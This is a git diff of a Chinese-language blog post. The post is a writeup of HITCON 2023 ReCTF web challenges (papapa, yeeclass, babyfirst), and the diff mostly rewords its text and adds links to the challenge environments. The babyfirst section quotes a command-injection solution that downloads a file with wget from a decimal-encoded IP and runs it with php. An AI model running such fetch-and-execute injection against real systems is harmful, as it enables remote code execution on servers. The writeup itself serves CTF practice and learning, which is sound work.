@@ -9,16 +9,17 @@ cover:
 ---
 ## 緣起
 
-上周被公司派去參加了 hitcon 2023，看到各路大神、後起之秀的超高水準研究以及那充滿夢想(?)的眼神，
-想起自己小時候其中一個夢想就是挖洞拿獎金達到財富自由，工作後慢慢忘記的 hacker 熱情又被點燃了。
-由於在台上的講者們都曾是 ctf 王，打 ctf 似乎是一個很好的鍛鍊方式，於是我打算如法炮製，試著打打看，看一年後我會不會搖身一變成挖洞高手，實現夢想👍👍。
+上周被公司派去參加了 hitcon 2023，看到各路大神、後起之秀的超高水準研究以及那充滿夢想(?)的眼神後，
+被激勵到，又燃起對 hack 的熱情了。剛好想到自己有個夢想就是挖洞拿獎金達到財富自由，
+由於在台上的講者們都曾是 ctf 王，打 ctf 似乎是個鍛鍊挖洞技能的好方法，於是我打算如法炮製，試著打打看，看一年後有沒有機會真的變成挖洞高手，挖洞賺大錢。
 
-在這次 hitcon 2023 我玩了 devcore wargame 和 rectf，{% post_link DEVCORE-Wargame-2023 %} 的部分只解了一題水題...(儘管我仍然花了 5 個小時)，rectf 因為開放時間比較久，費盡洪荒之力總算是解了兩題。在這邊放上 write up 和簡單的心路歷程，記錄一下。
+在這次 hitcon 2023 我玩了 devcore wargame 和 rectf，{% post_link DEVCORE-Wargame-2023 %} 的部分，在活動的兩天內我只解的掉一題水題...(儘管我仍然花了 5 個小時)，rectf 因為開放時間比較久，費盡洪荒之力總算是解了兩題。在這邊放上 writeup 和簡單的心得，記錄一下。
 
 ## ReCTF
 顧名思義，這個活動是將從前 hitcon ctf 出過的題目進行復刻。
 
 ### papapa
+> 環境：[Hitcon-Ctf-2016-Papapa 建置環境](https://peterli.website/hitcon-ctf-2016-papapa-%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/)
 {% img https://files.sakana.tw/HITCON-2023-ReCTF/papapa-1.png 450 挖勒 %}
 一進來頁面就長這樣，啥 input 都沒有，看了 cookie 感覺也沒能控制的點，我無言了...。
 通靈了一下子，決定爬文搜 papapa ctf，發現是 hitcon 2016 時 orange 出的題目([連結](https://peterli.website/hitcon-ctf-2016-papapa-%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/))，並翻了 orange github 的出題 src，原來解題的關鍵在憑證...。
@@ -32,6 +33,7 @@ cover:
 這次真的拿到了 `hitcon{n0w_4y_h4v3_th3_f14g}`，原來 flag 不是在 `/index.html` 是在 `/`，還好不是藏很深(呼氣)。
 
 ### yeeclass
+> 環境：附上 [docker-compose](https://github.com/t510599/My-CTF-Challenges/tree/master/HITCON%20CTF/2022/yeeclass)
 {% img https://files.sakana.tw/HITCON-2023-ReCTF/yeeclass-1.png 450 %}
 這個題目很佛心的給了你整個 source 包括 docker compose，所以只要 trace code 就好，
 我原本是這樣想的...，但我前一小時真的看不出洞。
@@ -91,6 +93,7 @@ Reference:
 - https://stoneapp.tech/cavern/post.php?pid=948
 
 ### babyfirst
+> 環境: [babyfirst](https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2015/babyfirst) (至於當時環境的 php 版本我用 wappalyzer 看記得是 7.1.34，但我想用啥版本都影響不大，反正我用 8.1 好像還是一樣可以打)
 <script src="https://gist.github.com/orangetw/cb3487e47d7aaaea4692.js"></script>
 (應該沒人認真看這篇，我偷偷 host orange 的 gist 應該不會有人發現吧？)
 
@@ -105,7 +108,7 @@ Reference:
    - 如何下載？首先 ip `xxx.xxx.xxx.xxx` 就有 `.`
 
 感覺都不行，我低下的想像力不知道怎麼辦了。偷偷看了一下 orange 的 writeup，確定 wget 可以。於是我又想了一個小時，靈機一動 ip 有 decimal 形式，`wget 2130706433(127.0.0.1)`成功下載檔案。
-但 `wget` 抓下來的檔名是 `index.html`，就算 302 轉向到別的網頁一樣，又再卡住一次。
+但 `wget` 抓下來的檔名是 `index.html`，就算 302 轉向到別的網頁還是一樣。又卡住了 QQ。
 爬文幾乎每篇講 linux 下載檔案的，都是用 curl、wget。而 curl 也是會用到特殊符號。mv 也要輸入檔案名 `index.html`
 
 在爬了一個多小時的文之後，果斷去看 writeup🥹。
@@ -116,7 +119,7 @@ wget HEXED_IP
 tar cvf payload orange
 php payload
 ```
-看了我還是不懂，php 怎麼可能執行 tar 後的檔案，實際試了一次後，還真的可以直接執行😱，為什麼會有這種 feature？！
+看了我還是不懂，php 怎麼可能執行 tar 後的檔案，實際試了一次後，shit，還真的可以直接執行😱，為什麼會有這種 feature？！
 
 除此之外還有
 - wget 302 重導向到 ftp，可以解決 index.html 預設檔名的問題。
@@ -149,6 +152,6 @@ Reference:
 
 #### babyfirst
 看完 writeup 後，我難得慶幸還好我有看，因為我真的想不出來這幾招...學到了。
-還有一個原因可能是我對 linux 的 core util 太不熟了，希望未來會慢慢改善。
+可能也是因為我對 linux 的 coreutils 太不熟了，希望未來會改善。
 
 
